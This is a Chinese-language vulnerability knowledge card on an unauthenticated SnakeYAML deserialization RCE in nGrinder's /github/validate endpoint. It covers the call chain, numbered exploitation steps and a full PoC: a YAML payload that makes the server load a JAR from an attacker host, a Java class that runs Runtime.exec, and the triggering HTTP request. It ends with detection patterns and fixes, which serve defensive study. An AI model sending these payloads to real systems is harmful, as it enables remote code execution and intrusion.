---
id: web-java-deser-ngrinder-github-validate-snakeyaml
title: nGrinder /github/validate 未授权 SnakeYAML loadAll 反序列化：!!ScriptEngineManager + URLClassLoader 加载远程 yaml-payload 执行命令
type: scenario
domain: web
path: web/java/deserialization
technique: snakeyaml-loadall-scriptenginemanager-rce
aliases:
- nGrinder SnakeYaml 反序列化
- nGrinder github validate RCE
- validateGithubConfig 反序列化
- FileEntryApiController SnakeYAML
- nGrinder 未授权 RCE
tags:
- java
- snakeyaml
- yaml
- deserialization
- scriptenginemanager
- urlclassloader
- ngrinder
- unauth
- rce
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V579
  verified_at: '2026-11-12T12:27:01+08:00'
  notes: 已对照原文294行与2张截图核对：FileEntryApiController#validateGithubConfig(@PostMapping /github/validate,@RequestBody FileEntry)无@PreAuthorize→GitHubFileEntryService.validate→getAllGithubConfig→new Yaml().loadAll(gitConfigYaml.getContent())的调用链与原文代码逐段吻合；loadAll惰性迭代→BaseConstructor.getData→constructDocument→Constructor.ConstructSequence实例化ScriptEngineManager→SPI ServiceLoader加载远程类 的原理与原文一致；PoC采用原文推荐的artsploit/yaml-payload !!javax.script.ScriptEngineManager[!!java.net.URLClassLoader[[!!java.net.URL[...]]]]结构正确；卡片指出构造后ClassCastException(classMap.put当Map用)不影响执行，为对原文的合理补充。原文未给出成功回连截图，卡片如实注明并标 confidence medium。dedup：top为自身；Nacos(配置中心写权限+客户端刷新)、TarzanCMS(后台主题上传)均不同入口，非同链，dedup_review成立；dup-scan无该卡pair。原文未标注 nGrinder 版本，affected_versions 为空正确。未验证点：未复跑PoC。
---

## 一句话结论

nGrinder 的 `FileEntryApiController#validateGithubConfig`（`POST /github/validate`）没有权限校验，`@RequestBody FileEntry` 的 `content` 被直接交给 `new Yaml().loadAll(...)` 解析；匿名攻击者提交含 `!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker/yaml-payload.jar"]]]]` 的 YAML，即可让服务端通过 `ServiceLoader` 加载攻击者 JAR 中的 `ScriptEngineFactory` 并执行其构造方法，形成未授权 RCE。

## 原理

- **未授权入口**：nGrinder 用 Spring Security 的 `@PreAuthorize` 做权限校验；`validateGithubConfig(@RequestBody FileEntry fileEntry)` 既无注解、参数也不是 `User` 实体，因此匿名可达。
- **完整调用链**：
  - `validateGithubConfig` → `GitHubFileEntryService#validate(fileEntry)`；
  - `validate` 首先调用 `getAllGithubConfig(gitConfigYaml)`；
  - `getAllGithubConfig` 中执行 `Yaml yaml = new Yaml(); Iterable<Map<String, Object>> gitConfigs = cast(yaml.loadAll(gitConfigYaml.getContent()));`，`content` 完全可控，`Yaml` 为默认构造器（未使用 `SafeConstructor`）；
  - `loadAll(Reader)` 返回惰性迭代器，`for` 循环取元素时进入 `BaseConstructor#getData` → `constructDocument(node)`；
  - 当文档根节点带 `!!javax.script.ScriptEngineManager` 全局标签时，`Constructor.ConstructSequence` 按标签实例化该类并解析其构造参数。
- **为什么成立**：SnakeYAML 1.x 默认 `Constructor` 允许 `!!类名` 全局标签实例化任意 classpath 类并调用其构造方法，等价于反序列化。`ScriptEngineManager` 的 `ScriptEngineManager(ClassLoader)` 构造方法会执行 `init(loader)` → `initEngines(loader)` → `ServiceLoader.load(ScriptEngineFactory.class, loader)`；`ServiceLoader` 迭代时 `hasNextService()` 拼接 `META-INF/services/javax.script.ScriptEngineFactory` 并调用 `loader.getResources(...)`。当 loader 是 YAML 里构造的 `URLClassLoader` 时，服务端会向攻击者 URL 请求 SPI 配置文件并加载其中的实现类，实例化 `AwesomeScriptEngineFactory` 时其构造方法执行 `Runtime.exec`。
- **业务报错不代表利用失败**：`for` 循环把构造出的对象当 `Map` 使用（`configMap.put("revision", ...)`），`ScriptEngineManager` 并非 `Map`，随后抛 `ClassCastException`；但对象构造与 SPI 加载在此之前已经完成，命令已经执行。

## 触发条件

- 目标 nGrinder 对外可达，`FileEntryApiController` 的 `/github/validate` 未授权可达（默认部署满足）。
- 目标使用默认构造器的 SnakeYAML 解析 `FileEntry.content`（SnakeYAML 1.x 语义）。
- 目标可访问攻击者提供的 `yaml-payload.jar` 与 `META-INF/services/javax.script.ScriptEngineFactory` 资源（HTTP 即可）。
- 恶意 `ScriptEngineFactory` 实现与目标 JVM 兼容，且执行命令的进程权限足够。

## 利用步骤

1. 使用 yaml-payload 结构编写 `AwesomeScriptEngineFactory implements ScriptEngineFactory`，在无参构造方法中执行目标命令；用 `META-INF/services/javax.script.ScriptEngineFactory` 注册实现类全名。
2. 编译并打包为 `yaml-payload.jar`，与 SPI 配置一起放到攻击者 HTTP 根目录（如 `python3 -m http.server`）。
3. 构造 `FileEntry` JSON 请求体，`content` 字段为恶意 YAML（其余字段按目标 `FileEntry` 源码补全，如 `revision`）。
4. 向目标发送 `POST /github/validate`（控制器类级前缀以源码为准，方法级映射为 `/github/validate`）。
5. 观察攻击者 HTTP 日志出现 `GET /META-INF/services/javax.script.ScriptEngineFactory` 与 `GET /yaml-payload.jar`，目标主机执行命令。
6. 接口可能返回 500（`ClassCastException: javax.script.ScriptEngineManager cannot be cast to java.util.Map`），以回连与命令结果为准。

## PoC

恶意 YAML（作为 `FileEntry.content`）：

```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker:8000/yaml-payload.jar"]
  ]]
]
```

yaml-payload 关键实现（构造方法执行命令）：

```java
package artsploit;

public class AwesomeScriptEngineFactory implements javax.script.ScriptEngineFactory {
    public AwesomeScriptEngineFactory() {
        try {
            Runtime.getRuntime().exec("id");   // 或 dnslog/写文件等
        } catch (Exception e) { e.printStackTrace(); }
    }
    // 其余接口方法返回默认值即可
}
```

```text
META-INF/services/javax.script.ScriptEngineFactory 内容：
artsploit.AwesomeScriptEngineFactory
```

触发请求：

```http
POST /github/validate HTTP/1.1
Host: target
Content-Type: application/json

{"content":"!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://attacker:8000/yaml-payload.jar\"]]]]","revision":"r1"}
```

说明：请求体字段形状按 `FileEntry` 源码补全，`content` 为关键字段；原文未给出成功回连截图，本卡未在本机复跑。

## 变体与关联

- 同一 gadget 家族（`ScriptEngineManager`/`URLClassLoader`/`yaml-payload`）：[[web-java-deser-tarzancms-snakeyaml-scriptenginemanager-rce]]（后台主题上传）、[[web-java-deser-nacos-config-yaml-snakeyaml-yaml-payload-rce]]（配置中心投毒）、[[web-java-framework-spring-actuator-bootstrap-location-yaml-rce]]（Actuator 注入远程 YAML）、[[web-java-deserialization-dolphinscheduler-k8s-namespace-snakeyaml-loadas-rce]]（loadAs 拼接）。
- 差异点：本篇入口是匿名 HTTP JSON 参数直接进入 `Yaml.loadAll`，不需要后台会话、文件上传或配置中心写权限；`loadAll` 的多文档惰性迭代同样会触发构造。
- 变体：若目标屏蔽出网，可换用目标本地已有的工厂类或其它 SnakeYAML gadget；若 `loadAll` 被改为 `SafeConstructor`，该链失效。
- 边界：SnakeYAML 2.x 默认安全构造器、接口补鉴权、目标不能访问 JAR URL 时链不成立。

## 检测与防御

- 检测：`/github/validate` 请求体出现 `!!javax.script.ScriptEngineManager`、`!!java.net.URLClassLoader`、`!!java.net.URL` 等全局标签；目标向外部请求 `META-INF/services/*` 或 `.jar`；应用日志出现 `ClassCastException: javax.script.ScriptEngineManager`。
- 防御：给 `validateGithubConfig` 补 `@PreAuthorize` 或整体收紧未授权接口；使用 `new Yaml(new SafeConstructor())` 或类型白名单解析不可信 YAML，禁止 `!!` 全局标签实例化任意类；限制应用出站访问；升级 SnakeYAML 并按官方安全模式配置。
- 加固：进程最小权限运行，监控 Java 进程异常创建子进程与对外 JAR 下载行为。
